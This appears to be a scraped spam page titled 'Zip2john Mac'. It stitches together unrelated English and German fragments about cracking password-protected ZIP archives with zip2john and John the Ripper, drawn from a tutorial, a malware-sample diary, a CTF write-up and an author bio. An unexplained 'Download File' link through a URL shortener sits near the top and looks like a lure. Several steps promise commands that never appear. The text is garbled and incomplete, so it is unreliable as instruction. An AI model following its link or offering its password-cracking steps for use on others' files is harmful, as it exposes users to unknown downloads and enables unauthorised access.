# Zip2john Mac
 
 
Potentially the fastest way to crack the zip file is to use a dictionary attack. There are a lot of dictionaries/wordlists online, and john can iterate through them and through variations on the words in the list. Skull Security has a nice set to get you started. After you have downloaded one, then you can start running john:
 
**Download File ⚹⚹⚹ [https://tinourl.com/2A0Teu](https://tinourl.com/2A0Teu)**


 
The zip\_hash.txt file gets created in the local directory your are in. In my example, that would be in the run directory. But you can put it anywhere. just change the path to be absolute. For example, this would put it in /tmp:
> ./zip2john /path/to/file.zip > /tmp/zip\_hash.txt
 
Jan's diary entry "One way to fail at malspam - give recipients the wrong password for an encrypted attachment" got my attention: it's an opportunity for me to do some password cracking :-) I asked Jan for the sample.
 
Just like Jan noticed, I saw that the sample is not actually a 7zip file, but a ZIP file. This could be a mistake by the malware authors, or it could be deliberate: 7zip is able to decompress a ZIP file with extension 7z.
 
Then I turned to John the Ripper. I used zip2john to create a hash for the sample, and created a password list file with a single line: AWB3604. And then I let JtR use all of its built-in rules on this "dictionary":
 
To demonstrate the use of both of those tools we will create a password protected zip file using the following command. As you can see the file has been protected and we cannot see the contents of the file.

Suppose what you will do if you have a zip file and have forgotten the password that you set during file creation ? Now our first step will be to get a hashes of the zip file using the zip2john tool. Just give us the location of the password protected zip file and the location where we want to save the hash. After getting the hash you can open them using the cat command.
 
Now our work has become very easy as you can see that just we need to give the location of the saved hash and it will try its own dictionary to crack the password of the zip file through the hash. After trying several combinations it has found a valid password to unzip the compressed file.
 
A keen learner and passionate IT student. He has done Web designing, CCNA, RedHat, Ethical hacking, Network & web penetration testing. Currently, he is completing his graduation and learning about Red teaming, CTF challenges & Blue teaming.
 
There was a zip archive inside this folder. But it was password protected. So I used the zip2john tool to extract the password hash first. Then I used the john tool along with the passwords that we gathered from the webpage to crack the hash. This is how I did it:
 
John The Ripper ist ein sehr leistungsstarkes Tool zum hacken von Passwrtern. Ich bin darauf gestoen, weil ich selbst neulich ein geschtztes zip-Archiv auf der Festplatte gefunden hatte und leider das Passwort dazu nicht mehr wusste. Unklar war auch, welche Daten ich dort genau hinein gelegt hatte. Also musste ein Passwortcracker her. Der war unter Ubuntu zwar grundstzlich verfgbar, funktionierte aber nicht. Scheinbar wurde die notwendigen Zusatztools \*2john aus der Standardinstallation entfernt. Hier nun eine Beschreibung in Kurzform wie man John trotzdem nutzen kann.
 
ABER: diese Anleitung dient ausschlielich dazu, sich bei einem Missgeschick in der og Weise selbst behelfen zu knnen. Wer versucht unbefugt auf Daten anderer Zuzugreifen, kann sich leicht strafbar machen, 303a StGB ff sollten dazu gelesen und verstanden sein.
 
Der Standardweg der Installation unter Ubuntu wre ber apt oder snap. Beides hat bei mir nicht funktioniert. Daher hier der Weg via github.
Im eigenen Heimatverzeichnis der Konsole folgendes ausfhren:
 
Anschlieend wieder zurck ins eigene Homeverzeichnis wechseln und die HASHES aus dem entsprechenden .zip-file auslesen lassen. Diese werden dann in eine Datei geschrieben, anhand derer JohnTheRipper dann versucht, das Passwort zu ermitteln:
 
Das Tool zip2john ist wie so einige andere 2john-Tools bei der Standardinstallation von Ubuntu nicht vorhanden. Deswegen der Umweg ber git.
Nachdem das file mit den Hashes erstellt wurde, wird John gestartet und geht ans Werk. Das kann wenige Sekunden bis Wochen(!) dauern, je nach Komplexitt des Passworts.
Der Aufruf lautet:
 
Am Ende des Prozesses wird dann fr jeden gefundenen Hash-Wert das jeweilige Passwort ausgegeben (wenn es denn geknackt werden konnte). Auf diese Weise lsst sich brigens auch die Sicherheit der eigenen Passwrter prfen. Wird das Passwort in wenigen Sekunden ermittelt, war es wohl kein besonders gutes und sollte komplexer werden.
 a2f82b0cb4
 
